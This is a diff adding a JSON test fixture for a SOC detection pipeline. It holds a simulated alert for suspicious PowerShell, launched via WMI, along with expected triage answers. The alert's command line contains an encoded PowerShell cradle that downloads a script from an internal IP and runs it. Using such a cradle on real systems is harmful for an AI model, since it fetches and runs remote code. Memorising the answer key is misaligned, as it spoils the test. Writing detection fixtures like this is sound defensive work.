@@ -1,0 +1,34 @@
+{
+  "search_name": "SPARKSOC - Suspicious PowerShell Execution",
+  "sid": "validate_ps_001",
+  "result_count": 2,
+  "trigger_time": 0,
+  "severity": "high",
+  "results": [
+    {
+      "_time": "2026-08-18T09:14:02.113Z",
+      "host": "WIN11-RANGE-04",
+      "User": "CORP\\svc_backup",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAwAC4AOQA5AC4ANQAvAGEALgBwAHMAMQAnACkA",
+      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+      "ProcessGuid": "{a1b2c3d4-1122-6532-1e00-000000001f00}",
+      "Hashes": "SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53",
+      "risk_note": "encoded or obfuscated PowerShell invocation"
+    },
+    {
+      "_time": "2026-08-18T09:14:03.881Z",
+      "host": "WIN11-RANGE-04",
+      "User": "CORP\\svc_backup",
+      "Image": "C:\\Windows\\System32\\conhost.exe",
+      "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    }
+  ],
+  "_expect": {
+    "disposition": ["suspicious", "malicious"],
+    "techniques": ["T1059.001", "T1027", "T1047", "T1105"],
+    "max_fast_ms": 15000
+  }
+}
